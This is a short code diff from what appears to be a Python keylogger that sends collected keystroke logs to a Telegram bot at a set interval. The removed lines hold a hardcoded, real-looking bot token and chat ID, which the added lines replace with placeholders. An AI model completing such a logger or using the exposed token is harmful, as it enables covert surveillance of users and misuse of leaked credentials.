@@ -8,8 +8,8 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 
 log = ""  
-bot_token = "7583155762:AAF0tjeO4TufEfzKVrCzyRwiGA0_x9840e8"  # chnage with your Telegram bot token
-chat_id = "772369130"  # change with your Telegram chat ID here https://t.me/chatIDrobot
+bot_token = "YOUR_TELEGRAM_TOKEN"  # chnage with your Telegram bot token
+chat_id = "YOUR_TEEGRAM_CHAT_ID"  # change with your Telegram chat ID here https://t.me/chatIDrobot
 interval = 10  # Set time interval in seconds to send logs
 
 current_keys = set()
